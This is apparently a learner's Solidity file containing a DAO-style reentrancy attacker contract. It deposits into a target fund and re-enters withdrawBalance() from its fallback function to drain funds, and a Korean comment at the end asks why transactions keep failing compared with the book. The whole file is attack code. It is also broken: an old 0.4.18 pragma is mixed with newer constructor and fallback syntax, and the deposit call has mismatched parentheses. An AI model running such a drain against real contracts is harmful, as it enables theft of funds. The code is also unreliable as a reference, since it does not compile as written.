// pragma solidity >=0.7.0 <0.9.0;
pragma solidity ^0.4.18; 

contract DaoFundAttacker {
    address fundAddress;
    int goalAmount;
    event WithdrawBalance(string message, uint gas);

    // function DaoFundAttacker (address _fundAddress) public {
    constructor (address _fundAddress) {
        fundAddress = _fundAddress;
    }

    // function() public payable
    fallback()external payable {
        goalAmount -= int(msg.value);

        if(goalAmount > 0) {
            if(fundAddress.call(bytes4(keccak256("withdrawBalance()")))) {
                emit WithdrawBalance("Succeeded in fallback", gasleft());
            } else emit WithdrawBalance("Failed in fallback", gasleft());
        }
        else {
            emit WithdrawBalance("All GoalAmount is withdrawn", gasleft());
        }
    }

    function deposit() public payable {
        if(fundAddress.call.value(msg.value).gas(gasleft()))
            (bytes4(keccak256("addToBalance()")))==false) {
            revert();
        }
    }

    function withdraw(uint _goalAmount) public {
        goalAmount = int(_goalAmount * 1 ether);

        if(fundAddress.call(bytes4(keccak256("withdrawBalance()"))) == false) {
            emit WithdrawBalance("Failed in withdraw", gasleft());
            revert();
        }
        else emit WithdrawBalance("Succeeded in withdraw", gasleft());
    }
}


//거래가 자꾸 실패, 왜 책이랑 다르니